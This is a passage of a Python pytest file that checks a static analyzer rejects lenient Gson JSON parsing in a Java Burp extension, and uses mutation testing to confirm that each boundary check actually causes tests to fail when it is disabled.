# ─────────────────────────────── java_masker_parity 정적 하위 검사: 관대한 Gson API 금지
LENIENT_FIXTURES = {
    "json_parser_parse_string": ("Object v = com.google.gson.JsonParser.parseString(s);", "lenient_json_json_parser"),
    "json_parser_parse_reader": ("Object v = JsonParser.parseReader(r);", "lenient_json_json_parser"),
    "static_import_parse_string": ("Object v = parseString(s);", "lenient_json_json_parser"),
    "gson_from_json": ("Object v = new com.google.gson.Gson().fromJson(s, Object.class);", "lenient_json_gson_convert"),
    "gson_to_json": ("String v = new com.google.gson.Gson().toJson(s);", "lenient_json_gson_convert"),
    "gson_builder": ("Object g = new com.google.gson.GsonBuilder().create();", "lenient_json_gson_builder"),
    "set_lenient": ("r.setLenient(true);", "lenient_json_set_lenient"),
    "strictness_lenient": ("r.setStrictness(com.google.gson.Strictness.LENIENT);", "lenient_json_lenient_strictness"),
    "strictness_legacy": ("r.setStrictness(com.google.gson.Strictness.LEGACY_STRICT);", "lenient_json_lenient_strictness"),
    "reader_without_strict": ("Object r = new com.google.gson.stream.JsonReader(new java.io.StringReader(s));",
                              "json_reader_not_strict"),
}


@pytest.mark.parametrize("name", sorted(LENIENT_FIXTURES))
def test_lenient_json_fixture_is_rejected(tmp_path, name):
    stmt, expected = LENIENT_FIXTURES[name]
    project = _copy(tmp_path)
    _write(project, f"{CORE}/Loose.java", "package sentinel.burp.transport.masker;\n\nfinal class Loose {\n"
           f"    void f(String s, com.google.gson.stream.JsonReader r) {{\n        {stmt}\n    }}\n}}\n")
    assert expected in _codes(jb.lenient_json_violations(project), jb.MASKER_PARITY), name


def test_real_core_uses_only_the_strict_reader():
    assert jb.lenient_json_violations(PROJECT) == []
    core = (PROJECT / "src/main/java" / "sentinel/burp/transport/masker/StrictJson.java").read_text(encoding="utf-8")
    assert "setStrictness(Strictness.STRICT)" in core and "new JsonReader(" in core


# ─────────────────────────────── 변이 확인(변이본 로드 표지 확인 후 결과 해석)
STAMP = "java_boundary_probe"
_DRIVER = """
import os, sys, importlib
sys.path[:] = [p for p in sys.path if p not in ("", os.getcwd())]
importlib.import_module(sys.argv[1])
import pytest
code = pytest.main(["-q", "-p", "no:cacheprovider", *sys.argv[2:]])
print(f"{STAMP} module={sys.modules[sys.argv[1]].__file__} keys=-", flush=True)
sys.exit(int(code))
"""
_T = "tests/test_java_boundary.py::"
_JB, _BUILD = "tools.java_boundary", "tools.java_build"
MUTATIONS = {
    "no_target_send_allowlist_off": (_JB, "                    if call.group(1) not in MONTOYA_CALLS:\n",
                                     "                    if False:\n",
                                     [_T + "test_target_send_fixture_is_rejected[call_outside_allowlist]"]),
    "loopback_transport_rule_off": (_JB, "        if not in_transport:\n", "        if False:\n",
                                    [_T + "test_loopback_fixture_is_rejected[client_outside_transport]"]),
    "logic_entry_count_off": (_JB, "    if len(entries) != 1:\n", "    if False:\n",
                              [_T + "test_logic_isolation_fixture_is_rejected[two_entry_points]"]),
    "build_coordinate_allowlist_off": (_JB, "        if (conf, g, a) not in ALLOWED_COORDS:\n", "        if False:\n",
                                       [_T + "test_build_egress_fixture_is_rejected[coordinate_not_allowed]"]),
    "r2_declared_identifier_check_removed": (_JB, "        if _member_access(f.lexed.code, m.start()) and token not in declared:\n",
                                             "        if _member_access(f.lexed.code, m.start()):\n",
                                             [_T + "test_r2_fixture[declared_member_called_elsewhere]"]),
    "lenient_json_check_off": (_JB, "            if rx.search(code):\n                out.append(Violation(MASKER_PARITY",
                               "            if False:\n                out.append(Violation(MASKER_PARITY",
                               [_T + "test_lenient_json_fixture_is_rejected[json_parser_parse_string]"]),
    "core_java_net_rule_off": (_JB, "        if _in_core(f, root) and re.search(", "        if False and re.search(",
                               [_T + "test_core_and_transport_fixture_is_rejected[core_java_net_import]"]),
    "preflight_wrapper_check_removed": (_BUILD, "    problems = [f\"wrapper 고정값 위반: {v.code}\" for v in "
                                                "java_boundary.wrapper_violations(project)]\n",
                                        "    problems = []\n",
                                        [_T + "test_tampered_wrapper_script_is_never_executed"]),
}


@pytest.mark.parametrize("name", sorted(MUTATIONS))
def test_java_boundary_check_is_load_bearing_under_verified_mutation(tmp_path, name):
    module, old, new, nodes = MUTATIONS[name]
    rel = module.replace(".", "/") + ".py"
    mutant = copy_with_mutation(REPO_ROOT, ["tools"], tmp_path / "mut", rel, old, new)
    env = {**os.environ, "PYTHONUTF8": "1",
           "PYTHONPATH": os.pathsep.join([str(tmp_path / "mut"), str(REPO_ROOT / "src"), str(REPO_ROOT)])}
    env.pop("PYTEST_ADDOPTS", None)
    r = subprocess.run([sys.executable, "-c", _DRIVER.replace("{STAMP}", STAMP), module, *nodes],
                       cwd=REPO_ROOT, env=env, capture_output=True, text=True, encoding="utf-8", timeout=600)
    out = r.stdout + r.stderr
    assert_loaded_from(out, STAMP, mutant)
    assert r.returncode == 1, f"변이 {name}가 살아남음\n{out}"
    for node in nodes:
        assert f"FAILED {node}" in out, f"{node}가 변이본에서 실패하지 않음\n{out}"
